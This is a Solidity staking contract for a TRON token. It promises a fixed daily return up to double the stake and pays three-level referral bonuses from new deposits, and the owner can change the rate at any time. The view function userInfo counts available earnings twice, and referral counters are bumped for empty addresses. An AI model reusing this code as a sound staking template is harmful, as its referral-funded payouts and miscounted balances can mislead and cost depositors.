//SourceUnit: GEC-Staking.sol

pragma solidity ^0.5.9;

contract StakeGEC {
    using SafeMath for uint;

    address payable public owner;
    ITRC20 public GECtoken;

    uint public invested;
    uint public earnings;
    uint public withdrawn;
    uint public direct_bonus;
    
    uint public minDeposit = 50000000000;
    uint public maxDeposit = 5000000000000;
    uint public maxStake = 10000000000000000;
    
    
    uint public DailyRoi = 57871; 
    address payable private defaultref = msg.sender;
    uint internal lastUid = 1;

    DataStructs.Plan[] public plans;

    mapping(address => DataStructs.Player) public players;

    mapping(uint => address) public getPlayerbyId;

    event ReferralBonus(address indexed addr, address indexed refBy, uint bonus);
    event NewDeposit(address indexed addr, uint amount);
    event Withdraw(address indexed addr, uint amount);

   
       constructor(address payable _owner, ITRC20 _token) public {
       owner = _owner;
       GECtoken = _token;
       }

    /**
     * Modifiers
     * */
    modifier hasDeposit(address _userId){
        require(players[_userId].deposits.length > 0);
        _;
    }
                                                                                              
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
  function _checkout(address _userId) private hasDeposit(_userId){
        DataStructs.Player storage player = players[_userId];
        if(player.deposits.length == 0) return;
        uint _minuteRate;
       
        uint _myEarnings;

        for(uint i = 0; i < player.deposits.length; i++){
            DataStructs.Deposit storage dep = player.deposits[i];
            uint secPassed = now - dep.time;
            if (secPassed > 0) {
                _minuteRate = DailyRoi;
                 
                uint _gross = dep.amount.mul(secPassed).mul(_minuteRate).div(1e12);
                
                uint _max = dep.amount.mul(2);
                uint _releasednet = dep.earnings;
                uint _released = dep.earnings.add(_gross);
                
                if(_released < _max){
                    _myEarnings += _gross;
                    dep.earnings += _gross;
                    dep.time = now;
                }
                
           else{
            uint256 collectProfit_net = _max.sub(_releasednet); 
             
             if (collectProfit_net > 0) {
             
             if(collectProfit_net <= _gross)
             {_myEarnings += collectProfit_net; 
             dep.earnings += collectProfit_net;
             dep.time = now;
             }
             else{
             _myEarnings += _gross; 
             dep.earnings += _gross;
             dep.time = now;}
             }
              else{
              _myEarnings += 0;
              dep.earnings += 0; 
              dep.time = now;
              }
            }
                
}
        }
        
        player.finances[0].available += _myEarnings;
        player.finances[0].last_payout = now;
        player.finances[0].total_earnings += _myEarnings;
        }

       function _Register(address _addr, address _affAddr) private{

        
        address _refBy = _affAddr;

        DataStructs.Player storage player = players[_addr];

        player.refBy = _refBy;

        address _affAddr1 = _refBy;
        address _affAddr2 = players[_affAddr1].refBy;
        address _affAddr3 = players[_affAddr2].refBy;
       
       

        players[_affAddr1].refscount[0].aff1sum = players[_affAddr1].refscount[0].aff1sum.add(1);
        players[_affAddr2].refscount[0].aff2sum = players[_affAddr2].refscount[0].aff2sum.add(1);
        players[_affAddr3].refscount[0].aff3sum = players[_affAddr3].refscount[0].aff3sum.add(1);
        
        

        player.playerId = lastUid;
        getPlayerbyId[lastUid] = _addr;

        lastUid++;
    }


    /*
    * Only external call
    */

    function() external payable{

    }
    
     function directDeposit(address  _refBy, uint _amount) external{
        DataStructs.Player storage player = players[msg.sender];
        require(invested.add(_amount) <= maxStake,'Total staked amount is equal to or more than 100 Million');
        require(player.finances[0].total_invested == 0,'One address can stake only once');
        require(_amount >= minDeposit && _amount <= maxDeposit,'Stake between 500 to 50000');
        require(ITRC20(GECtoken).transferFrom(msg.sender, address(this), _amount),'Failed_Transfer');
        deposit(_amount, msg.sender, _refBy);
    }

    function deposit(uint _amount, address payable _userId, address _refBy) internal {
        
        DataStructs.Player storage player = players[_userId];

           if(_refBy != address(0) && _refBy != _userId){
              _Register(_userId, _refBy);
            }
            else{
              _Register(_userId, defaultref);
            }
          
        player.deposits.push(DataStructs.Deposit({
            
            amount: _amount,
            earnings: 0,
            time: uint(block.timestamp)
            }));

        player.finances[0].total_invested += _amount;
        invested += _amount;
        
        
        distributeRef(_amount, player.refBy);
        
        _checkout(_userId);
        emit NewDeposit(_userId, _amount);
        
    }
    
    function distributeRef(uint256 _trx, address _affFrom) private{
        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].refBy;
        address _affAddr3 = players[_affAddr2].refBy;
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(10)).div(100);
            players[_affAddr1].finances[0].available += _affRewards;
            players[_affAddr1].finances[0].total_cashback += _affRewards;
            players[_affAddr1].finances[0].total_earnings += _affRewards;

            direct_bonus += _affRewards;
            earnings += _affRewards;
            emit ReferralBonus(msg.sender, _affAddr1, _affRewards);
         }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            players[_affAddr2].finances[0].available += _affRewards;
            players[_affAddr2].finances[0].total_cashback += _affRewards;
            players[_affAddr2].finances[0].total_earnings += _affRewards;
            direct_bonus += _affRewards;
            earnings += _affRewards;
            emit ReferralBonus(msg.sender, _affAddr2, _affRewards);
         }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            players[_affAddr3].finances[0].available += _affRewards;
            players[_affAddr3].finances[0].total_cashback += _affRewards;
            players[_affAddr3].finances[0].total_earnings += _affRewards;
            direct_bonus += _affRewards;
            earnings += _affRewards;
            emit ReferralBonus(msg.sender, _affAddr3, _affRewards);
          }

   
    }

        function withdraw() external {
        ITRC20 _token = ITRC20(GECtoken);
        address payable _userId = msg.sender;
        DataStructs.Player storage player = players[_userId];
        _checkout(_userId); 
        uint amount = player.finances[0].available;
        require(amount > 0, "Insufficient Balance!");

        _token.transfer(_userId, amount);
        player.finances[0].total_withdrawn += amount;
        player.finances[0].available = 0;
        withdrawn += amount;
        emit Withdraw(msg.sender, amount);
    }


  function _getEarnings(address _userId) view external returns(uint) {

        DataStructs.Player storage player = players[_userId];
        if(player.deposits.length == 0) return 0;
        uint _minuteRate;
        uint _myEarnings;
             for(uint i = 0; i < player.deposits.length; i++){ 
            DataStructs.Deposit storage dep = player.deposits[i];
            uint secPassed = now - dep.time;
            if (secPassed > 0) {
                _minuteRate = DailyRoi;
                
                uint _gross = dep.amount.mul(secPassed).mul(_minuteRate).div(1e12);
                
                uint _max = dep.amount.mul(2);
                uint _releasednet = dep.earnings;
                uint _released = dep.earnings.add(_gross);
                
                
        if(_released < _max){
                    _myEarnings += _gross;
                }
            else{
            uint256 collectProfit_net = _max.sub(_releasednet); 
             
             if (collectProfit_net > 0) {
             
             if(collectProfit_net <= _gross)
             {_myEarnings += collectProfit_net; 
             }
             else{
             _myEarnings += _gross; 
             }
             }
              else{
              _myEarnings += 0;
              }
            }
        }
  }
        return player.finances[0].available.add(_myEarnings);
    }
    
        function userInfo(address _userId) view external returns(uint for_withdraw, uint total_invested, uint total_withdrawn, uint total_cashback, uint aff1sum, address refby) {
        DataStructs.Player storage player = players[_userId];
        uint _myEarnings = this._getEarnings(_userId).add(player.finances[0].available);

        return (
        _myEarnings,
        player.finances[0].total_invested,
        player.finances[0].total_withdrawn,
        player.finances[0].total_cashback,
        player.refscount[0].aff1sum,
        player.refBy);
}
    
    
    function RefInfo(address _userId) view external returns(uint aff1sum, uint aff2sum, uint aff3sum) {
        DataStructs.Player storage player = players[_userId];
        return (
        player.refscount[0].aff1sum,
        player.refscount[0].aff2sum,
        player.refscount[0].aff3sum);
}

    function contractInfo() view external returns(uint, uint, uint, uint, uint, uint) {
        ITRC20 _token = ITRC20(GECtoken);
        uint contractbalance = _token.balanceOf(address(this));
        return (invested, withdrawn, earnings.add(withdrawn), direct_bonus, lastUid, contractbalance);
    }
    
    /**
     * Restrictied functions
     * */

	function setOwner(address payable _owner) external onlyOwner()  returns(bool){
        owner = _owner;
        return true;
    }
    
    function AddFunds(uint _amount) public{
        require(ITRC20(GECtoken).transferFrom(msg.sender, address(this), _amount),'Failed_Transfer');
     }

    function updateDefaultref(address payable _address) public {
       require(msg.sender==owner);
       defaultref = _address;
    }
    
       function setDailyRoi(uint256 _DailyRoi) public {
      require(msg.sender==owner);
      DailyRoi = _DailyRoi;
    } 
    
      function setMinDeposit(uint256 _MinDeposit) public {
      require(msg.sender==owner);
      minDeposit = _MinDeposit;
    }
    
      function setMaxDeposit(uint256 _MaxDeposit) public {
      require(msg.sender==owner);
      maxDeposit = _MaxDeposit;
    }   
    
      function setMaxStake(uint256 _MaxStake) public {
      require(msg.sender==owner);
      maxStake = _MaxStake;
    }     
}

contract StakeGEC_{

    struct Deposit {
        //uint planId;
        uint amount;
        uint earnings; // Released = Added to available
        uint time;
    }

    struct Player {
        address refBy;
        uint available;
        uint total_earnings;
        uint total_direct_bonus;
        uint total_cashback; // used for refcommission
        uint total_invested;
        uint last_payout;
        uint total_withdrawn;
        Deposit[] deposits;
    }
    
    mapping(address => Player) public players;

    function _getEarnings(address _userId) external view returns(uint){}


						  
    function userInfo(address _userId) external view returns(uint, uint, uint, uint){}

}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

library DataStructs{
    struct Plan{
        uint minDeposit;
        uint maxDeposit;
        uint maxStake;
        uint dailyRate;
        uint maxRoi;
    }

    struct Deposit {
        //uint planId;
        uint amount;
        uint earnings; 
        uint time;
    }

    struct RefsCount{
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
}

   
     struct Finances{
        uint available;
        uint total_earnings;
        uint total_direct_bonus;
        uint total_cashback; 
        uint total_invested;
        uint last_payout;
        uint total_withdrawn;
        }

    struct Player {
        uint playerId;
        address refBy;
        Finances[1] finances;
        Deposit[] deposits;
        RefsCount[1] refscount;
        
    }
}
interface ITRC20 {

    function balanceOf(address tokenOwner) external pure returns (uint balance);

    function transfer(address to, uint value) external returns (bool);

    function approve(address spender, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);
}